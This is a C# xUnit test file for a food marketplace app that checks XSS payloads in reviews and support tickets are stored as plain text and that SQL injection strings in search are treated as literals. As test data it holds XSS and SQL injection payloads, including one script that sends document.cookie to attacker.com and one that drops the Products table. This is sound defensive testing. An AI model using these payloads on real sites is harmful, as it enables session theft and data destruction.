using FluentAssertions;
using FoodLoop.Application.Common.Interfaces;
using FoodLoop.Application.Common.Models;
using FoodLoop.Application.DTOs.Products;
using FoodLoop.Application.DTOs.Reviews;
using FoodLoop.Application.Features.Products.Queries;
using FoodLoop.Application.Features.Reviews.Commands;
using FoodLoop.Application.Features.SupportTickets.Commands;
using FoodLoop.Domain.Entities;
using FoodLoop.Domain.Enums;
using FoodLoop.Infrastructure.Features.Products.Queries;
using FoodLoop.Infrastructure.Features.Reviews.Commands;
using FoodLoop.Infrastructure.Features.SupportTickets.Commands;
using FoodLoop.Infrastructure.Identity;
using FoodLoop.Infrastructure.Persistence;
using FoodLoop.Infrastructure.Tests.TestSupport;
using Microsoft.EntityFrameworkCore;
using Moq;
using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Xunit;

namespace FoodLoop.Infrastructure.Tests.Features.Security;

public class SecurityAndPenetrationFuzzingTests : IDisposable
{
    private readonly ApplicationDbContext _db = ApplicationDbContextFactory.Create();
    private readonly Mock<IAuditLogService> _mockAudit = new();

    private readonly Guid _userId = Guid.NewGuid();
    private readonly Guid _orgId = Guid.NewGuid();
    private readonly Guid _productId = Guid.NewGuid();

    public SecurityAndPenetrationFuzzingTests()
    {
        var user = new ApplicationUser
        {
            Id = _userId,
            UserName = "securitytester@test.com",
            Email = "securitytester@test.com",
            FullName = "Security Tester",
            Status = UserStatus.Active
        };
        _db.Users.Add(user);

        var org = new Organization
        {
            Id = _orgId,
            OwnerId = _userId,
            Name = "Security Store",
            VerificationStatus = VerificationStatus.Verified
        };
        _db.Organizations.Add(org);

        var product = new Product
        {
            Id = _productId,
            OrganizationId = _orgId,
            CategoryId = Guid.NewGuid(),
            Title = "Safe Organic Apples",
            Description = "Fresh pesticide-free apples",
            OriginalPrice = 50m,
            DiscountedPrice = 30m,
            QuantityAvailable = 10,
            ExpirationDate = DateOnly.FromDateTime(DateTime.Today.AddDays(5)),
            Status = ProductStatus.Active
        };
        _db.Products.Add(product);

        _db.SaveChanges();
    }

    public void Dispose() => _db.Dispose();

    [Theory(DisplayName = "TC-SEC-01: Stored XSS and script injection in reviews are stored as text and do not execute")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img src=x onerror=alert(document.cookie)>")]
    [InlineData("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\'/+alert(1)>")]
    public async Task SubmitReview_XssPayloadInComment_SafelyHandledWithoutExploitation(string xssPayload)
    {
        var order = new Order
        {
            Id = Guid.NewGuid(),
            UserId = _userId,
            TotalAmount = 30m,
            OrderStatus = OrderStatus.Completed,
            PaymentStatus = PaymentStatus.Paid
        };
        order.Items.Add(new OrderItem { ProductId = _productId, Quantity = 1, UnitPrice = 30m });
        _db.Orders.Add(order);
        await _db.SaveChangesAsync();

        var handler = new SubmitReviewCommandHandler(_db, _mockAudit.Object);
        var command = new SubmitReviewCommand(_userId, order.Id, 5, xssPayload);

        var result = await handler.Handle(command, CancellationToken.None);

        result.Success.Should().BeTrue();
        result.Data.Should().NotBeNull();
        result.Data!.Comment.Should().Be(xssPayload);

        // Verify stored in DB without database corruption
        var reviewInDb = await _db.Reviews.FindAsync(result.Data.Id);
        reviewInDb!.Comment.Should().Be(xssPayload);
    }

    [Theory(DisplayName = "TC-SEC-02: SQL Injection patterns in marketplace search are treated as literal strings")]
    [InlineData("' OR '1'='1")]
    [InlineData("'; DROP TABLE Products; --")]
    [InlineData("1 UNION SELECT null, null, null, null--")]
    [InlineData("\" or \"\"=\"")]
    public async Task GetMarketplaceProducts_SqlInjectionSearchTerm_SafelyReturnsEmpty(string sqlPayload)
    {
        var handler = new GetMarketplaceProductsQueryHandler(_db);
        var query = new GetMarketplaceProductsQuery(
            UserLatitude: null,
            UserLongitude: null,
            MaxDistanceKm: null,
            CategoryId: null,
            MinPrice: null,
            MaxPrice: null,
            SearchTerm: sqlPayload,
            SortBy: null,
            PageNumber: 1,
            PageSize: 20
        );

        var result = await handler.Handle(query, CancellationToken.None);

        // Assert query executes safely without throwing SQL exception and returns no false matches
        result.Should().BeEmpty();
    }

    [Fact(DisplayName = "TC-SEC-03: Stored XSS payload in Support Ticket message is safely persisted")]
    public async Task CustomerReplyToSupportTicket_XssPayloadInMessage_SafelyPersisted()
    {
        var ticket = new SupportTicket
        {
            Id = Guid.NewGuid(),
            UserId = _userId,
            Category = "Payment",
            Status = TicketStatus.Open,
            Priority = TicketPriority.High
        };
        _db.SupportTickets.Add(ticket);
        await _db.SaveChangesAsync();

        var xssMessage = "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>";
        var handler = new CustomerReplyToSupportTicketCommandHandler(_db);
        var command = new CustomerReplyToSupportTicketCommand(_userId, ticket.Id, xssMessage);

        var result = await handler.Handle(command, CancellationToken.None);

        result.Success.Should().BeTrue();
        result.Data.Should().NotBeNull();
        result.Data!.Message.Should().Be(xssMessage);

        var msgInDb = await _db.TicketMessages.FindAsync(result.Data.Id);
        msgInDb!.Message.Should().Be(xssMessage);
    }
}
